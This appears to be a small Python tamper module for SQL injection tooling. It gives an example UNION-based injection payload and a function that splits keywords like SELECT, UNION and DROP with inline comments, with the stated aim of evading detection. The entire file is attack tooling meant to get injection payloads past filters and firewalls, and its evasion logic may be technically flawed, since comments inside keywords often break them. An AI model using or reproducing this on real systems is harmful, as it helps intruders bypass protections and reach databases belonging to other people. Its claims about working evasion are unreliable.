import string

__example_payload__ = "' UNION SELECT NULL,NULL--"
__type__ = "splitting SQL keywords with inline comments to avoid detection"


def tamper(payload, **kwargs):
    keywords = ["SELECT", "UNION", "NULL", "FROM", "WHERE", "AND", "OR", "DROP", "INSERT", "DELETE"]
    for kw in keywords:
        if kw in payload.upper():
            mid = len(kw) // 2
            injected = kw[:mid] + "/**/" + kw[mid:]
            payload = payload.replace(kw, injected)
            payload = payload.replace(kw.lower(), injected.lower())
    return payload
